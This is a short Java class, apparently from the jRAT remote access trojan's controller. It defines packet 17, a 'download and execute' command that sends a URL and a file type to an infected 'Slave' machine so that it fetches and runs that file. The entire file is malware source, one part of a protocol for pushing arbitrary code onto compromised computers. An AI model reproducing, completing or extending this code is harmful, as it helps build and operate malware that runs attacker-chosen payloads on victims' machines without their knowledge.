package pro.jrat.client.packets.outgoing;

import java.io.DataOutputStream;

import pro.jrat.client.Slave;

public class Packet17DownloadExecute extends AbstractOutgoingPacket {

	private String url;
	private String filetype;

	public Packet17DownloadExecute(String url, String filetype) {
		this.url = url;
		this.filetype = filetype;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(url);
		slave.writeLine(filetype);
	}

	@Override
	public byte getPacketId() {
		return 17;
	}

}
